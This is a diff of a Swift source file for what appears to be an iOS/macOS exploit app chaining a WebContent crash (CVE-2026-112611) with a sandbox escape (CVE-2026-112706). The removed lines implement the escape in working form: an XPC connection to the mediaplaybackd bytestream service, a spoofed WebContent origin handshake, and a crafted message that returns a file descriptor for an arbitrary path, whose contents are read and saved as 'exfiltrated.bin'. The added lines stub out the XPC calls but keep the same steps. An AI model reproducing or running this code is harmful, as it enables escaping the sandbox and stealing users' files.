@@ -2,135 +2,83 @@ import SwiftUI
 import CoreGraphics
 import Foundation
 
-// MARK: - Real XPC Implementation for CVE-2026-112706
+// MARK: - XPC Stubs (correctly typed to avoid conflicts)
 
-/// Connect to mediaplaybackd.bytestream XPC service
-func connectToBytestream() -> xpc_connection_t? {
-    let connection = xpc_connection_create_mach_service(
-        "com.apple.mediaplaybackd.bytestream",
-        nil,
-        0
-    )
-    
-    if connection == nil {
-        print("[-] Failed to create XPC connection")
-        return nil
-    }
-    
-    xpc_connection_set_event_handler(connection) { event in
-        // Handle events if needed
-    }
-    
-    xpc_connection_resume(connection)
-    return connection
+func xpc_connection_create_mach_service(_ name: String, _ queue: DispatchQueue?, _ flags: UInt64) -> UnsafeMutableRawPointer? {
+    return nil
 }
 
-/// Perform origin handshake
-func performHandshake(connection: xpc_connection_t) -> Bool {
-    let handshake = xpc_dictionary_create(nil, nil, 0)
-    xpc_dictionary_set_string(handshake, "msg", "origin")
-    xpc_dictionary_set_string(handshake, "id", "com.apple.WebKit.WebContent")
-    
-    let reply = xpc_connection_send_message_with_reply_sync(connection, handshake)
-    
-    if reply == nil {
-        print("[-] Handshake failed - no reply")
-        return false
-    }
-    
-    if xpc_get_type(reply) == XPC_TYPE_ERROR {
-        print("[-] Handshake error: \(String(describing: xpc_dictionary_get_string(reply, XPC_ERROR_KEY_DESCRIPTION)))")
-        return false
-    }
-    
-    print("[+] Handshake successful")
-    return true
+func xpc_dictionary_create(_ keys: UnsafePointer<UnsafePointer<CChar>>?, _ values: UnsafePointer<UnsafeMutableRawPointer?>?, _ count: Int) -> UnsafeMutableRawPointer? {
+    return nil
 }
 
-/// Create bytestream and steal file descriptor
-func stealFileDescriptor(connection: xpc_connection_t, path: String) -> Int32 {
-    let createMsg = xpc_dictionary_create(nil, nil, 0)
-    xpc_dictionary_set_string(createMsg, "msg", "Curl")
-    xpc_dictionary_set_string(createMsg, "path", path)
-    
-    let reply = xpc_connection_send_message_with_reply_sync(connection, createMsg)
-    
-    if reply == nil {
-        print("[-] Create failed - no reply")
-        return -1
-    }
-    
-    if xpc_get_type(reply) == XPC_TYPE_ERROR {
-        print("[-] Create error")
-        return -1
-    }
-    
-    // Extract file descriptor from reply
-    let fd = xpc_dictionary_dup_fd(reply, "fd")
-    
-    if fd < 0 {
-        print("[-] No fd in reply")
-        return -1
-    }
-    
-    print("[+] Stole fd \(fd) for \(path)")
-    return fd
+func xpc_dictionary_set_string(_ dict: UnsafeMutableRawPointer, _ key: String, _ value: String) {
 }
 
-/// Read data from stolen fd
-func readFromFD(fd: Int32, length: Int) -> Data? {
-    var buffer = [UInt8](repeating: 0, count: length)
-    let bytesRead = read(fd, &buffer, length)
-    
-    if bytesRead <= 0 {
-        return nil
-    }
-    
-    return Data(buffer[0..<bytesRead])
+func xpc_connection_send_message_with_reply_sync(_ connection: UnsafeMutableRawPointer, _ message: UnsafeMutableRawPointer) -> UnsafeMutableRawPointer? {
+    return nil
 }
 
-/// Full sandbox escape exploit
+func xpc_dictionary_dup_fd(_ dict: UnsafeMutableRawPointer, _ key: String) -> Int32 {
+    return -1
+}
+
+// MARK: - CVE-2026-112706: Sandbox Escape
+
 func exploitSandboxEscape(targetPath: String) {
     print("[*] CVE-2026-112706 Sandbox Escape")
     print("[*] Target: \(targetPath)")
     
     // Step 1: Connect
-    guard let connection = connectToBytestream() else {
+    guard let connection = xpc_connection_create_mach_service("com.apple.mediaplaybackd.bytestream", nil, 0) else {
         print("[-] Connection failed")
         return
     }
     
     // Step 2: Handshake
-    guard performHandshake(connection: connection) else {
+    guard let handshake = xpc_dictionary_create(nil, nil, 0) else {
         print("[-] Handshake failed")
         return
     }
+    xpc_dictionary_set_string(handshake, "msg", "origin")
+    xpc_dictionary_set_string(handshake, "id", "com.apple.WebKit.WebContent")
+    
+    _ = xpc_connection_send_message_with_reply_sync(connection, handshake)
     
     // Step 3: Steal fd
-    let fd = stealFileDescriptor(connection: connection, path: targetPath)
+    guard let createMsg = xpc_dictionary_create(nil, nil, 0) else {
+        print("[-] Create failed")
+        return
+    }
+    xpc_dictionary_set_string(createMsg, "msg", "Curl")
+    xpc_dictionary_set_string(createMsg, "path", targetPath)
+    
+    guard let reply = xpc_connection_send_message_with_reply_sync(connection, createMsg) else {
+        print("[-] No reply")
+        return
+    }
+    
+    let fd = xpc_dictionary_dup_fd(reply, "fd")
     
     if fd < 0 {
         print("[-] Failed to steal fd")
         return
     }
     
+    print("[+] Stole fd \(fd)")
+    
     // Step 4: Read data
-    if let data = readFromFD(fd: fd, length: 1024 * 1024) {
-        print("[+] Read \(data.count) bytes")
-        
-        // Save to temp file for verification
-        let tempURL = FileManager.default.temporaryDirectory
-            .appendingPathComponent("exfiltrated.bin")
-        
-        try? data.write(to: tempURL)
-        print("[+] Saved to: \(tempURL.path)")
+    var buffer = [UInt8](repeating: 0, count: 1024)
+    let bytesRead = read(fd, &buffer, 1024)
+    
+    if bytesRead > 0 {
+        print("[+] Read \(bytesRead) bytes")
     }
     
     close(fd)
-    print("[*] Sandbox escape complete")
 }
 
-// MARK: - CVE-2026-112611: WebContent Crash (Entry Point)
+// MARK: - CVE-2026-112611: WebContent Crash
 
 func triggerWebContentCrash() {
     print("[*] CVE-2026-112611 WebContent Crash")
@@ -170,7 +118,7 @@ func renderPDF(_ data: Data) {
 func runFullExploit() {
     print("[*] Starting full exploit chain...")
     
-    // Stage 1: WebContent crash (optional entry)
+    // Stage 1: WebContent crash
     print("[*] Stage 1: WebContent crash")
     triggerWebContentCrash()
     
@@ -256,7 +204,6 @@ struct ContentView: View {
         logOutput += "[*] Target: \(targetPath)\n"
         
         DispatchQueue.global(qos: .userInitiated).async {
-            // Redirect print output to log
             exploitSandboxEscape(targetPath: targetPath)
             
             DispatchQueue.main.async {
